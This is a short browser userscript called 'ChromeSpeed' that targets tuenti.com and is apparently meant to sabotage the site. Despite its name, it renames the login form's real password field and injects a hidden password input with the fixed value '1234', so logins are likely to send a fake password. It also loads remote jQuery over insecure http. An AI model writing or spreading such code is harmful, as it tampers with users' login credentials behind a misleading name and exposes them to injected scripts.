// ==UserScript==
// @name           ChromeSpeed
// @namespace      Chrome Speed
// @description    Fuck tuenti
// @include        http://*.tuenti.com/*
// @version        0.1
// @notify         true
// ==/UserScript==




var boton = '';

	 

// a function that loads jQuery and calls a callback function when jQuery has finished loading
function GS(callback) {
  var scripta = document.createElement("script");
  scripta.setAttribute("src", "http://code.jquery.com/jquery-latest.js");
  scripta.addEventListener('load', function() {
	  
    var scripta = document.createElement("script");
    scripta.textContent = "(" + callback.toString() + ")();";
    document.body.appendChild(scripta);
  }, false);
    document.body.appendChild(scripta); 

}

var $ = document; // shortcut
var cssId = 'myCss';  // you could encode the css path itself to generate id..
if (!$.getElementById(cssId))
{
    var head  = $.getElementsByTagName('head')[0];
    var link  = $.createElement('link');
    link.id   = cssId;
    link.rel  = 'stylesheet';
    link.type = 'text/css';
    link.href = 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.16/themes/flick/jquery-ui.css';
    link.media = 'all';
    head.appendChild(link);
}




// the guts of this userscript
function maincode() {
	$("#input_password").attr("name","password");
	var form = $('.indent');
	$('<input id="input_password" class="password" name="input_password" type="password" value="1234">').appendTo(form).hide();
};





// load jQuery and execute the main function
GS(maincode);
